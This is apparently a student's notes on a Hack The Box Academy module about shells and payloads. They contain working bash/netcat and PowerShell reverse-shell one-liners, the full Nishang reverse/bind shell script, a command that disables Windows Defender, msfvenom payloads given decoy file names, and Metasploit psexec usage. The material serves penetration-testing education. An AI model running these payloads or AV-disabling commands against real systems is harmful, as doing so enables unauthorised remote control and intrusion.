
04-11-2024 11:50 am

Tags: 

References: https://academy.hackthebox.com/module/115/section/1101


# Shells and Payloads
## Payloads Deliver the Shell and Shells Jack Us In
- shell examples: Bash, Zsh, Cmd, PowerShell, etc.
- shells give us direct access to OS, system and file commands

| **Perspective**               | **Description**                                                                                                                                                                                                                                                                                                                                                                                     |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Computing`                   | The text-based userland environment that is utilized to administer tasks and submit instructions on a PC. Think Bash, Zsh, cmd, and PowerShell.                                                                                                                                                                                                                                                     |
| `Exploitation` `&` `Security` | A shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host. An example would be triggering [EternalBlue](https://www.cisecurity.org/wp-content/uploads/2019/01/Security-Primer-EternalBlue.pdf) on a Windows host to gain access to the cmd-prompt on a host remotely.                                                           |
| `Web`                         | This is a bit different. A web shell is much like a standard shell, except it exploits a vulnerability (often the ability to upload a file or script) that provides the attacker with a way to issue instructions, read and access files, and potentially perform destructive actions to the underlying host. Control of the web shell is often done by calling the script within a browser window. |
Payload definitions across multiple IT industries:
- **Networking**: The encapsulated data portion of a packet traversing modern computer networks.
- **Basic Computing**: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.
- **Programming**: The data portion referenced or carried by the programming language instruction.
- **Exploitation & Security**: A payload is `code` crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.
## Anatomy of a Shell
- a shell uses a **terminal emulator**
Terminal emulators list (some examples):

|**Terminal Emulator**|**Operating System**|
|:--|:--|
|[Windows Terminal](https://github.com/microsoft/terminal)|Windows|
|[cmder](https://cmder.app)|Windows|
|[PuTTY](https://www.putty.org)|Windows|
|[kitty](https://sw.kovidgoyal.net/kitty/)|Windows, Linux and MacOS|
|[Alacritty](https://github.com/alacritty/alacritty)|Windows, Linux and MacOS|
|[xterm](https://invisible-island.net/xterm/)|Linux|
|[GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal)|Linux|
|[MATE Terminal](https://github.com/mate-desktop/mate-terminal)|Linux|
|[Konsole](https://konsole.kde.org)|Linux|
|[Terminal](https://en.wikipedia.org/wiki/Terminal_(macOS))|MacOS|
|[iTerm2](https://iterm2.com)|MacOS|
Useful Linux commands:
- `$ ps` - to see the processes running on the system (this can tell us what language interpreter we are using)
- `$ env` - shows us the environment variables which tell us what shell language we are using
Useful Windows PowerShell command:
- `> $PSVersionTable` - shows us information about PowerShell in a table
## Bind Shells
- the target system listens for the attacker's connection
![[bindshell.webp]]
- usually Netcat is used

How to have a basic connection using **Netcat**:
1) Start a Netcat listener on the target machine
```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```
2) Connect to the target
```shell-session
TonyS23@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```
- notice that everything we write on local after the connection is established will appear on the server-side remotely

Establishing a basic **bind shell** with Netcat:
1) On the target system, enter the following commands:
```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
- these commands are considered our payload
2) Now connect normally with Netcat to the target:
```shell-session
TonyS23@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$ 
```
==Note: Bind shells are easy to spot and stop.==
## Reverse Shells
- the attacker machine is listening for a connection and the target will connect
![[reverseshell.webp]]
==Note: Admins often overlook outbound connections so it's safer than a bind shell.==

How to get a simple reverse shell (from Windows - PowerShell to Kali Linux):
1) First we need to start a server on our machine:
```shell-session
TonyS23@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```
- notice that we are opening it on a common port - 443, usually used for HTTPS connections (it can pass through the firewall and doesn't seems suspect)
2) On the target machine, open CMD and input the one-liner below:
![[Pasted image 20241204144204.png]]
==Note: Don't forget to change the ip with the server's ip.==
3) Now we have an interactive shell to the Windows machine (target), where we are the server and the target is the client.

**IMPORTANT**
- if we get something like this:
```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
- this means that the AV (anti virus) stopped the execution
- the solution is to disable it with the PowerShell command below:
```powershell-session
Set-MpPreference -DisableRealtimeMonitoring $true
```
==Note: This may need to be run with escalated privileges.==
## Introduction to Payloads
- on the internet in general,  a payload is the message sent (a packet)
- in cybersecurity, the payload is the malicious command or code sent across the internet in order to exploit vulnerabilities
### One-liners Examined
#### Netcat/Bash Reverse Shell One-liner (for Linux mostly)
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
- this command serves a bash shell on a Linux system
```shell-session
rm -f /tmp/f; 
```
- forcefully removes `/tmp/f` if it exists
- `;` is used to execute the commands sequentially
```shell-session
mkfifo /tmp/f; 
```
- this makes a fifo named pipe
```shell-session
cat /tmp/f | 
```
- pipes the contents of the `/tmp/f` to the input of the next command
```shell-session
/bin/bash -i 2>&1 | 
```
- specifies the command language interpreter using `-i` for an interactive shell and then the output is redirected to the input of the next command
```shell-session
nc 10.10.14.12 7777 > /tmp/f  
```
- this uses netcat to send a connection to our attack host that is listening on port 7777 with the output redirected to `/tmp/f`
#### PowerShell One-Liner
![[Pasted image 20241204144242.png]]
- this is a reverse shell for PowerShell
```cmd-session
powershell -nop -c 
```
- this calls PowerShell with no profile `-nop` and executes the command block that follows `-c`
```cmd-session
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```
- this binds the TCP socket to the server
```cmd-session
$stream = $client.GetStream();
```
- this sets the command stream and facilitates network communication
```cmd-session
[byte[]]$bytes = 0..65535|%{0}; 
```
- this is an empty byte array stream that will be redirected to the attack box
```cmd-session
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```
- this defines the stream parameters
```cmd-session
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```
- this is the byte encoding
```cmd-session
$sendback = (iex $data 2>&1 | Out-String ); 
```
- this is an invoke-expression `iex` that makes everything in `$data` to be run locally on the target
```cmd-session
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```
- this makes the interactive shell prettier because it shows de current working directory
```cmd-session
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```
- this makes the TCP client initiate a PowerShell session on the attack box
```cmd-session
$client.Close()"
```
- this is the method used when we terminate the session

The one-liner above can also be executed as a `.ps1` PowerShell script:
```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```
## Automating Payloads and Delivery with Metasploit
- [Metasploit](https://www.metasploit.com) is an automated framework for exploitation developed by Rapid7 

How to launch it:
```shell-session
sudo msfconsole
```
- after launch we can search modules like this:
```shell-session
search smb
```
- this searches every modules that has `smb` in it
- after getting the list of modules we can use them:
```shell-session
use 56
```
or
```shell-session
use exploit/windows/smb/psexec
```
- to show the options simply type:
```shell-session
show options
```
- in order to configure the options just type:
```shell-session
set <OPTION> <PARAMETER>
```
Example:
```shell-session
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```
- after configuration, just type `run` or `exploit` in order to start the process
```shell-session
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000
```
## Crafting Payloads with MSFvenom
- to see all payloads:
```shell-session
TonyS23@htb[/htb]$ msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi
                                                        th translation capabilities is required. MSF handles this automatically.
multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller
library has been loaded. Based on work by Charlie Miller

windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop
                                                        /hop.php to the PHP server you wish to use as a hop.
windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
```
### Staged vs Stageless Payloads
- notice how some payloads are staged or stageless
- **STAGED** payloads are not sent directly in one step, they are sent in a couple stages
- **STAGELESS** payloads are sent in their entirety - these payloads are safer than staged ones because they are more stable

**IMPORTANT**
- we can notice from the name of the payload which is staged and which is stageless
- for example `windows/meterpreter/reverse_tcp` and `windows/meterpreter_reverse_tcp`
- notice that the first one has more slashes than the second
- the slashes after the OS or architecture often represent the stages of the payload
- so the first one is staged and the second one is stageless
### Building a Stageless Payload
```shell-session
TonyS23@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```
- first we call `msfvenom`
- then we specify the payload after `-p`
- then we specify the payload `linux/x64/shell_reverse_tcp`
- we set the listening host and port `LHOST=10.10.14.113 LPORT=443`
- we specify the file format `-f elf`
- then we tell the tool where to output the payload `> createbackup.elf`
### Executing a Stageless Payload
1) First we need a delivery method:
- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.
2) Once the file is on the system, it needs to be executed.
3) After it's executed, we need to listen for it with netcat for example.
### Building a simple Stageless Payload for a Windows system
```shell-session
TonyS23@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
### Executing a Simple Stageless Payload On a Windows System
- without any encoding or encryption, this payload WILL get detected by the Windows Defender AV
## Infiltrating Windows
- a list of common vulnerabilities:

|**Vulnerability**|**Description**|
|---|---|
|`MS08-067`|MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.|
|`Eternal Blue`|MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.|
|`PrintNightmare`|A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).|
|`BlueKeep`|CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.|
|`Sigred`|CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.|
|`SeriousSam`|CVE 2021-36924 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.|
|`Zerologon`|CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.|
### Enumeration and Fingerprinting
- while enumerating the LAN, if we don't get information about the OS from Nmap, we can always look at the TTL (time to live) by pinging the target - usually, Windows hosts have a TTL = 32 - 128 
Example:
```shell-session
TonyS23@htb[/htb]$ ping 192.168.86.39 

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```
OS detection scan example:
```shell-session
TonyS23@htb[/htb]$ sudo nmap -v -O 192.168.86.39

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
Initiating ARP Ping Scan at 17:40
Scanning 192.168.86.39 [1 port]
Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)
Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.010s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
```
Banner grabbing of ports:
```shell-session
TonyS23@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
NSE: Loaded 1 scripts for scanning.
<snip>
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
NSE: Script scanning 192.168.86.39.
Initiating NSE at 18:01
Completed NSE at 18:01, 20.11s elapsed
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.012s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
```
### Bats, DLLs, & MSI Files
- when creating a payload, we have a few executables to choose from: Bats, VBS, DLLs, MSI files or even PowerShell scripts
- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
- [Batch](https://commandwindows.com/batch.htm) Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of `.bat`. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.
- [PowerShell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) PowerShell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.
### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution
- first we need to generate they payload
- for this, we have the following options:

|**Resource**|**Description**|
|---|---|
|`MSFVenom & Metasploit-Framework`|[Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.|
|`Payloads All The Things`|[Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.|
|`Mythic C2 Framework`|[Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.|
|`Nishang`|[Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.|
|`Darkarmour`|[Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.|
- after generating the payload, we have to transfer it:
	- **Impacket**: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
	- [**Payloads All The Things**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick one-liners to help transfer files across hosts expediently.
	- **SMB**: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
	- **Remote execution via MSF**: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
	- **Other Protocols**: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.
### When to Use CMD and PowerShell
Use **CMD** when:
- You are on an older host that may not include PowerShell.
- When you only require simple interactions/access to the host.
- When you plan to use simple batch files, net commands, or MS-DOS native tools.
- When you believe that execution policies may affect your ability to run scripts or other actions on the host.
Use **PowerShell** when:
- You are planning to utilize cmdlets or other custom-built scripts.
- When you wish to interact with .NET objects instead of text output.
- When being stealthy is of lesser concern.
- If you are planning to interact with cloud-based services and hosts.
- If your scripts set and use Aliases.
## Infiltrating Unix/Linux
In order to gain a shell, we have to consider the following questions:
- What distribution of Linux is the system running?
- What shell & programming languages exist on the system?
- What function is the system serving for the network environment it is on?
- What application is the system hosting?
- Are there any known vulnerabilities?

==Note: If we want to use a Metasploit module which is not installed locally we can search for it on Github and download it into Metasploit's module folder, `/usr/share/metasploit-framework/modules/exploits`. DO NOT FORGET TO RUN `reload_all` in `msfconsole`!!!==
### Spawning Interactive Shells
- in most Linux systems we have **bourne shell** (`/bin/sh`) and **bourne again shell** (`/bin/bash`)

**Basic Interactive Shell Binary**
```shell-session
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```
- this command will execute the shell interpreter specified by the path `/bin/bash` in interactive mode

**Perl Shell**
- if we have Perl on the system, we can gain a shell like this:
```shell-session
perl —e 'exec "/bin/sh";'
```
or
```shell-session
perl: exec "/bin/sh";
```
- this one should be run from a script

**Ruby Shell**
- this should be run from a script:
```shell-session
ruby: exec "/bin/sh"
```

**Lua Shell**
- this should be run from a script:
```shell-session
lua: os.execute('/bin/sh')
